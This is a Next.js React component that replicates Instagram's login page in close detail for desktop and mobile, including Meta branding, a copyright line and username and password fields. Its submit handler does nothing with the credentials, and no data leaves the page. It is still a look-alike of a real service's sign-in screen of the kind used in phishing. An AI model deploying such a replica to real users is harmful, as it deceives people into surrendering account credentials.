"use client";

import React, { useState, useEffect } from "react";
import Image from "next/image";
import Link from "next/link";
import {
  InstagramGradientIcon,
  InstagramSvgLogo,
  FacebookSmallIcon,
  ChevronLeftIcon,
  MetaLogo,
} from "@/components/common/Icons";
import LanguageModal from "@/components/common/LanguageModal";
import FloatingInput from "@/components/common/FloatingInput";
import FloatingInputMobile from "@/components/common/FloadtingInputMobile";

export default function InstagramHomePage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLangModalOpen, setIsLangModalOpen] = useState(false);
  const [selectedLanguage, setSelectedLanguage] = useState("English (US)");

  useEffect(() => {
    // Disable browser scroll restoration so Chrome never auto-scrolls down on load
    if (typeof window !== "undefined") {
      if ("scrollRestoration" in window.history) {
        window.history.scrollRestoration = "manual";
      }
      window.scrollTo(0, 0);
    }
  }, []);

  const isFormFilled = username.trim().length > 0 && password.trim().length > 0;

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormFilled) {
      return;
    }
  };

  return (
    <div className="min-h-[100dvh] flex flex-col font-sans antialiased selection:bg-[#0064e0] selection:text-white bg-[#1c2a33] lg:bg-transparent">
      {/* =========================================================================
          DESKTOP VIEW (Visible on lg: screens and up - 100% Matches Attached Image)
         ========================================================================= */}
      <div className="hidden h-[95vh] lg:flex flex-col flex-1 justify-between min-h-screen bg-[#101316]">
        {/* Main Split Grid */}
        <div className="flex-1 grid grid-cols-12 min-h-[calc(100vh-80px)]">
          
          {/* Left Split Panel: Darker Background (#101316) */}
          <div className="col-span-7 bg-[#101316] flex flex-col items-center justify-center px-8 py-8 border-r-[3px] border-[#242b35]">
            <div className="w-full max-w-full flex flex-col">

              
              
              {/* Instagram Glyph Icon */}
              <div className="mb-5 animate-fade-in">
                <InstagramGradientIcon className="w-[54px] h-[54px]" />
              </div>

              {/* Headline */}
              <h1 className="text-[34px] xl:text-[40px] font-semibold tracking-wide leading-[1.18] text-white mb-6 text-center">
                See everyday moments from your{" "} <br />
                <span className="bg-gradient-to-r from-[#ff4458] via-[#fd3170] to-[#d82b7d] text-transparent bg-clip-text">
                  close friends
                </span>
                .
              </h1>

              {/* Moments Banner Image */}
              <div className="relative w-full max-w-[370px] mx-auto aspect-[1.12/1]">
                <Image
                  src="/images/instgram_banner.webp"
                  alt="Instagram Moments"
                  fill
                  className="object-contain"
                  priority
                />
              </div>
            </div>
          </div>

          {/* Right Split Panel: Form Card (#181d23) */}
          <div className="col-span-5 bg-[#1f1f22] flex flex-col items-center justify-center px-10 py-8 ">
            <div className="w-full max-w-full flex flex-col gap-3.5">
              
              <h2 className="text-[17px] font-semibold text-white tracking-tight text-left mb-1">
                Log into Instagram
              </h2>

              <form onSubmit={handleLogin} noValidate className="flex flex-col gap-2.5">
                {/* Identifier input */}
                <FloatingInput
                  id="desktop-username"
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  label="Mobile number, username or email"
                  required
                />

                {/* Password input */}
                <FloatingInput
                  id="desktop-password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  label="Password"
                  required
                />

                {/* Log in button */}
                <button
                  type="submit"
                  className={`w-full h-[44px] rounded-full font-semibold text-[13.5px] tracking-wide transition-all mt-1 shadow-sm ${
                    isFormFilled
                      ? "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white shadow-md active:scale-[0.99]"
                      : "bg-[#184a86] text-white/80 hover:bg-[#0064e0]"
                  }`}
                >
                  Log in
                </button>

                {/* Forgot password */}
                {/* <div className="text-center my-1.5"> */}
                  <Link
                    href="/forgot-password"
                    className={`w-full h-[44px] flex justify-center items-center  rounded-full font-semibold text-[16px] tracking-wide transition-all mt-1 shadow-sm ${
                    isFormFilled
                      ? " text-white shadow-md active:scale-[0.99]"
                      : "bg-transparent text-white/80 hover:bg-[#363639]"
                  }`}
                  >
                    Forgot password?
                  </Link>
                {/* </div> */}

                {/* Log in with Facebook - Navigates to /facebook */}
                <Link
                  href="/facebook"
                  className="w-full h-[44px] rounded-full bg-[#28292c] hover:bg-[#363639] active:bg-[#1b2028] tracking-wide text-[#b0b4be] font-semibold text-[15px] flex items-center justify-center gap-2 transition-all mt-[40px]"
                >
                  <FacebookSmallIcon className="w-[18px] h-[18px]" />
                  <span>Log in with Facebook</span>
                </Link>

                {/* Create new account */}
                <Link
                  href="/create"
                  className="w-full h-[44px] rounded-full border border-[#0064e0] text-[#0095f6] tracking-wide hover:bg-[#363639] active:bg-[#0064e0]/20 font-semibold text-[15px] flex items-center justify-center transition-all mt-1"
                >
                  Create new account
                </Link>
              </form>

              {/* Meta Logo Footer */}
              <div className="flex justify-center items-center mt-6 text-[#9aa5b5]">
                <MetaLogo className="h-3.5" />
              </div>
            </div>
          </div>

        </div>

        {/* Desktop Footer */}
        <footer className="w-full bg-[#0d1013] border-t border-[#20262f] py-6 text-[11.5px] text-[#71767B] select-none">
          <div className="max-w-5xl mx-auto px-4 flex flex-col items-center gap-2.5">
            <div className="flex flex-wrap justify-center items-center gap-x-4 gap-y-1.5 text-[11.5px]">
              {[
                "Meta",
                "About",
                "Blog",
                "Jobs",
                "Help",
                "API",
                "Privacy",
                "Terms",
                "Locations",
                "Popular",
                "Instagram Lite",
                "Meta AI",
                "Threads",
                "Contact Uploading & Non-Users",
                "Meta Verified",
              ].map((link) => (
                <a
                  key={link}
                  href="#"
                  className="hover:underline text-[#71767B] transition-colors"
                  onClick={(e) => e.preventDefault()}
                >
                  {link}
                </a>
              ))}
            </div>

            <div className="flex items-center gap-3 text-[11.5px] mt-1.5">
              <button
                onClick={() => setIsLangModalOpen(true)}
                className="flex items-center gap-1 hover:underline text-[#71767B]"
              >
                <span>English</span>
                <svg className="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M6 9l6 6 6-6" />
                </svg>
              </button>
              <span>© 2026 Instagram from Meta</span>
            </div>
          </div>
        </footer>
      </div>

      {/* =========================================================================
          MOBILE VIEW (Screens below lg: - 100% Matches Attached Mobile Image)
         ========================================================================= */}
      <div className="flex lg:hidden flex-col justify-between min-h-[100dvh] w-full max-w-md mx-auto px-6 py-4 bg-[#1c2a33] select-none">
        {/* Top Header: Back Arrow & Centered Language Trigger */}
        <div className="relative flex items-center justify-between pt-1 pb-1 shrink-0">
          <button
            onClick={() => {}}
            aria-label="Back"
            className="p-1 -ml-1 text-gray-300 hover:text-white"
          >
            <ChevronLeftIcon className="w-6 h-6 stroke-[2.4]" />
          </button>
          <div className="w-6" />
        </div>

        <div className="flex items-center justify-center">
          <button
            onClick={() => setIsLangModalOpen(true)}
            className="text-[16px] text-[#7a889b] hover:text-gray-200 font-medium"
          >
            {selectedLanguage}
          </button>
        </div>

        <div className="flex items-center justify-center mt-[40px]">
          <InstagramSvgLogo className="w-[62px] h-[64px]" />
        </div>

        {/* Center Main Section: Icon + Inputs */}
        <div className="flex flex-col items-center justify-center my-auto w-full max-w-[360px] mx-auto py-1">
          {/* Instagram Gradient Icon */}
          

          {/* Form */}
          <form onSubmit={handleLogin} noValidate className="w-full flex flex-col gap-3">
            <FloatingInputMobile
              id="mobile-username"
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              label="Username, email or mobile number"
              heightClass="h-[65px]"
              roundedClass="rounded-xl"
              bgClass="bg-[#1b2830]"
              borderClass="border-[#243040]"
            />

            <FloatingInputMobile
              id="mobile-password"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              label="Password"
              heightClass="h-[65px]"
              roundedClass="rounded-xl"
              bgClass="bg-[#1b2830]"
              borderClass="border-[#243040]"
            />

            <button
              type="submit"
              className={`w-full h-[44px] rounded-full tracking-wide text-white font-semibold text-[15.5px] transition-all mt-1 shadow-md ${
                isFormFilled
                  ? "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] cursor-pointer active:scale-[0.99]"
                  : "bg-[#0064e0]/60 text-white/70 cursor-default"
              }`}
            >
              Log in
            </button>

            <div className="text-center mt-2">
              <Link
                href="/forgot-password"
                className="text-[15px] tracking-wide text-white hover:underline font-semibold"
              >
                Forgot password?
              </Link>
            </div>
          </form>
        </div>

        {/* Bottom Section: Create Account Button & Meta Logo */}
        <div className="w-full max-w-[360px] mx-auto flex flex-col items-center gap-3 pb-2 shrink-0">
          <Link
            href="/create"
            className="w-full h-[44px] rounded-full border border-[#54a1e5] text-[#54a1e5] hover:bg-[#0064e0]/10 font-semibold text-[15.5px] flex items-center justify-center transition-all"
          >
            Create new account
          </Link>

          <div className="flex items-center justify-center text-gray-300 pt-0.5">
            <MetaLogo className="h-3.5" />
          </div>
        </div>
      </div>

      {/* Language Bottom Sheet Modal */}
      <LanguageModal
        isOpen={isLangModalOpen}
        onClose={() => setIsLangModalOpen(false)}
        currentLanguage={selectedLanguage}
        onSelectLanguage={(lang) => setSelectedLanguage(lang)}
      />
    </div>
  );
}
